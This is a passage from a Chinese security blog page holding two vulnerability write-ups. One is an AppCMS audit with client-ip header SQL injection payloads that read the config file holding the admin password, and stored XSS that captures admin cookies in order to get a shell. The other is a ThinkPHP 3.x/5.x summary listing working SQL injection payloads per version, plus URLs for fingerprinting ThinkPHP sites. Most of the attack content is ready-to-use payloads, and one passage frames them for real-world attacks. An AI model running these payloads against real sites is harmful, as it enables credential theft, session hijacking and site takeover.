<p>笔者以读取存储后台口令的文件为例:</p>
<pre><code>core\config.php
</code></pre><p>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,(select SUBSTRING( load_file(&apos;C:\\web\\WWW\\appcms_2.0.101\\upload\\core\\config.php&apos;),500,300)),&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/dkandni4om7bnynr9jlz1yfo/image_1cqaqme1nsaj1b2i15j811k616nl3v.png" alt="image_1cqaqme1nsaj1b2i15j811k616nl3v.png-121kB"><br>返回前台留言板查看获取的文件内容:<br><img src="http://static.zybuluo.com/chhyx/si98287nh23iisr9tdbc65az/image_1cqaqpgqn1pv730ims81jhf1ked6c.png" alt="image_1cqaqpgqn1pv730ims81jhf1ked6c.png-112.7kB"></p>
<p><strong>XSS:</strong><br>我们以弹cookie为例子,在实战中插入xss平台接收后台COOKIE即可。<br>payload:</p>
<pre><code>client-ip: 1&apos;),(&apos;1&apos;,&apos;0&apos;,&apos;0&apos;,&apos;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&apos;,&apos;aa&apos;,&apos;1540085527&apos;,&apos;2.2.2.2&apos;)#
</code></pre><p>因为前台并没有登陆接口,所以弹出非登陆状态下的<code>PHPSESSION</code><br>前台留言板访问:<br><img src="http://static.zybuluo.com/chhyx/rwmq8zayn17q74l38yk7gin1/image_1cqar5dgl1fm1drn14stqlnktc7j.png" alt="image_1cqar5dgl1fm1drn14stqlnktc7j.png-88.1kB"></p>
<p>后台管理员访问:<br><img src="http://static.zybuluo.com/chhyx/xzzenl1ornmpn1darbezjgrd/image_1cqar3c9216g4lh1ckdni8g6o76.png" alt="image_1cqar3c9216g4lh1ckdni8g6o76.png-46.8kB"></p>
<p>平台接收后台地址及cookie后,我们进入后台用配置文件或模板处的命令执行即可拿Shell。</p>
<p>##<strong>6.鸡肋文件包含</strong><br>在读入口文件index.php时 碰到这样一行代码:</p>
<pre><code>require(dirname(__FILE__) . $tmp_file);
</code></pre><p>感觉可以利用,通过追溯可控参数<code>$tmp_file</code>发现$tpl时这样取得</p>
<pre><code>$tpl = isset($_GET[&apos;tpl&apos;]) ? $_GET[&apos;tpl&apos;] : &apos;index&apos;;
</code></pre><p>但是下面经过了这样一处判断 经测试:</p>
<pre><code>if (substr($tpl, strlen($tpl) - 4, 4) == &apos;.php&apos;) {
    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl;
} else {
    $tmp_file = &apos;/templates/&apos; . $from_mobile . &apos;/&apos; . $tpl . &apos;.php&apos;;
}
</code></pre><p>只能包含后缀为php的文件<br>利用的话:包含安装时的<code>step4.php</code>可看到数据库信息:</p>
<p><img src="http://static.zybuluo.com/chhyx/6j5d44yjrravi2qu68xq5ddn/image_1cqbgbcq43gcpvf1kf20acgq1m.png" alt="image_1cqbgbcq43gcpvf1kf20acgq1m.png-66.8kB"></p>
<p>涉及知识点:</p>
<pre><code>$_SERVER[&quot;HTTP_CLIENT_IP&quot;] 获得的值是HTTP中 Client-Ip( client-ip书写测试结果：服务器为window环境，则client-ip可以大小写混写。服务器环境为linux，则client-ip必须全部大写) 

$_SERVER[&quot;REMOTE_ADDR&quot;] 获得的值为 最后一个跟你的服务器握手的IP，可能会是代理IP或者其他 

$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 获得的值是HTTP中 X-Forwarded-For 

$_SERVER[&quot;HTTP_REFERER&quot;] 获得的值为 HTTP中的Referer 
</code></pre><p><code>insert into</code>一次性插入2条语句:<br><img src="http://static.zybuluo.com/chhyx/uux01p11khk2o94uw95fmies/image_1cq8ujiqq1qrggsg1a551rf9p7g20.png" alt="image_1cq8ujiqq1qrggsg1a551rf9p7g20.png-24.3kB"><br><img src="http://static.zybuluo.com/chhyx/5zr9h8qzxkyww0ekc6os0fkg/image_1cq8uk1mi6pt15dv16cf118igvq2d.png" alt="image_1cq8uk1mi6pt15dv16cf118igvq2d.png-12.1kB"></p>
<p>关于insert into注入 在最后一个字段的注入可以利用<code>当一个整数与一个字符相加时,整数具有操作符优先级</code><br>参考链接:<a href="https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0" target="_blank" rel="noopener">https://blog.csdn.net/qq_41007744/article/details/80213449?utm_source=blogxgwz0</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/18/Thinkphp3.x_5.x框架审计总结/" itemprop="url">代码审计 | Thinkphp3.x/5.x框架审计总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-18T08:15:41+08:00">
                2018-10-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。</p>
</blockquote>
<hr>
<p>今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:<br><a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注</a><br>然后自己绕不过<br><img src="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png" alt="image_1cq3l6los507172715g41e5lirp5f.png-45.9kB"><br>有绕过的大佬欢迎交流。</p>
<p>##<strong>版本:3.x</strong></p>
<p><strong>tp3.2.3 bind 注入</strong><br><strong>漏洞成因:</strong><code>当where条件可控时,parseWhereItem()的inc操作直接拼接可控值$val造成注入</code><br><strong>payload:</strong><code>id[]=bind&amp;id[]=0 and (updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>tp&lt;=3.2.4 order by注入</strong><br><strong>漏洞成因:</strong><code>parseOrder()处理函数直接拼接传进来的字符串</code><br><img src="http://static.zybuluo.com/chhyx/znarexfdy7bxxmqjevut7nen/image_1cq3i0btnbs51tsp139t1q61dhn1p.png" alt="image_1cq3i0btnbs51tsp139t1q61dhn1p.png-40.8kB"><br><strong>payload:</strong><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>ThinkPHP 3.2.3 find_select_delete注入</strong><br><strong>成因:</strong><code>$this-&gt;_parseOptions($options);方法进行了参数合并又没有二次校验导致的注入</code><br><strong>payload:</strong><code>?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/29/Thinkphp3.2_find_delete_selete注入分析/</a></p>
<p>##<strong>版本:5.x</strong><br><strong>1.thinkphp5.0.9 鸡肋SQL注入(PDo预处理)+信息泄露</strong><br><strong>成因:</strong><code>debug开启造成信息泄露+parseWhereItem()的in操作对$value无过滤且直接拼接</code><br><strong>payload:</strong><code>?id[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></p>
<p><strong>2.thinkphp5.0.10 filterExp过滤不全导致注入</strong><br><strong>成因:</strong><code>助手函数input默认调用的filterExp()函数过滤不全导致注入</code><br><strong>payload:</strong><code>user[0]=not like&amp;user[1][0]=aaa&amp;user[1][8]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--</code><br><strong>参考链接:</strong><a href="http://static.zybuluo.com/chhyx/81w6j9hqbr86tcsy5wpouq26/image_1cq3gbi4g1v0n1tqc15jf12191o80p.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致注入</a></p>
<p><strong>3.thinkphp5.0.14/15   insert/update注入(鸡肋)</strong><br><strong>成因:</strong><code>若传入参数为inc,parseData()函数会将将$val[1]与$val[2]拼接直接拼接导致注入</code><br><strong>payload:</strong><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP框架%205.0.x%20sql注入</a></p>
<p><strong>4.thinkphp5.x order by注入(鸡肋)</strong><br><strong>成因:</strong><code>与tp&lt;=3.2.4 order by注入成因类似</code><br><strong>payload:</strong><code>order[id</code>, 2) and updatexml(1,concat(0x3a,user()),1)– a][0]=111`<br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
<p><strong>识别基于THINKPHP框架的CMS:</strong></p>
<pre><code>http://xxxx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a
http://xxxx/4e5e5d7364f443e28fbf0d3ae744a59a
http://xxxxx/ThinkPHP/logo.png
http://xxxx/ThinkPHP/LICENSE.txt
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">39</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
